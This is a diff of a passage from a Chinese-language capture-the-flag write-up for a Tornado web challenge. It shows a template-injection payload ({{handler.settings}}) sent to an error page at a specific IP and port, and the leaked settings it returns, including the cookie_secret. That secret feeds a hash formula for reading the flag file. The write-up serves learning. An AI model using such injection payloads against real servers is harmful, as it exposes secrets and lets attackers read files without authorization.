@@ -112,9 +112,10 @@ md5(cookie_secret + md5(filename))
 /fllllllllllag
 ```
 
-报错页面存在SSTI，访问`http://49.4.78.9:31465/error?msg={{handler.settings}}` 得到配置信息。
+报错页面存在SSTI。
 
 ```html
+访问 `http://49.4.78.9:31465/error?msg={{handler.settings}}`得到配置信息。
 Whoops, looks like somethings went wrong . 
 {'login_url': '/login', 'template_path': 'templates', 'xsrf_cookies': True, 'cookie_secret': 'pGD*~9Y]N?>5zBvS_3768U+O}<#^k@oM$grqZQ4!yK1ucVnijmRJlFwI%hP(0exE', 'debug': False, 'file_path': '/www/static/files', 'static_path': 'static'}
 ```
